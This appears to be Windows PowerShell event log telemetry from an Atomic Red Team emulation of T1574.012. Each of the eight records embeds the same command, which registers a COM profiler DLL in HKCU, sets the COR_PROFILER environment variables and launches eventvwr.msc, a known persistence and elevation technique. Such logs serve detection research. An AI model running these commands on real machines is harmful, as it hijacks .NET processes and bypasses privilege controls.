{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:56.6175785"},"EventRecordID":"1067","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2629441e-8143-4816-92dc-e018d4eb7531\r\n\tHostApplication=powershell.exe &amp; {Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan\r\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\r\nSTART MMC.EXE EVENTVWR.MSC}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:56.6235504"},"EventRecordID":"1068","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2629441e-8143-4816-92dc-e018d4eb7531\r\n\tHostApplication=powershell.exe &amp; {Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan\r\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\r\nSTART MMC.EXE EVENTVWR.MSC}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:56.6316371"},"EventRecordID":"1069","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2629441e-8143-4816-92dc-e018d4eb7531\r\n\tHostApplication=powershell.exe &amp; {Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan\r\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\r\nSTART MMC.EXE EVENTVWR.MSC}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:56.6702521"},"EventRecordID":"1070","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2629441e-8143-4816-92dc-e018d4eb7531\r\n\tHostApplication=powershell.exe &amp; {Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan\r\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\r\nSTART MMC.EXE EVENTVWR.MSC}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:56.6927667"},"EventRecordID":"1071","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2629441e-8143-4816-92dc-e018d4eb7531\r\n\tHostApplication=powershell.exe &amp; {Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan\r\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\r\nSTART MMC.EXE EVENTVWR.MSC}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:56.6927667"},"EventRecordID":"1072","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2629441e-8143-4816-92dc-e018d4eb7531\r\n\tHostApplication=powershell.exe &amp; {Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan\r\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\r\nSTART MMC.EXE EVENTVWR.MSC}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:57.0452263"},"EventRecordID":"1073","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2629441e-8143-4816-92dc-e018d4eb7531\r\n\tHostApplication=powershell.exe &amp; {Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan\r\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\r\nSTART MMC.EXE EVENTVWR.MSC}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=add2dcdd-6f33-41dd-9310-94587ac1bed5\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:56:58.9994496"},"EventRecordID":"1074","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=2629441e-8143-4816-92dc-e018d4eb7531\r\n\tHostApplication=powershell.exe &amp; {Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan\r\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\r\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1574.012\\bin\\T1574.012x64.dll\" -Force | Out-Null\r\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\r\nSTART MMC.EXE EVENTVWR.MSC}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=add2dcdd-6f33-41dd-9310-94587ac1bed5\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
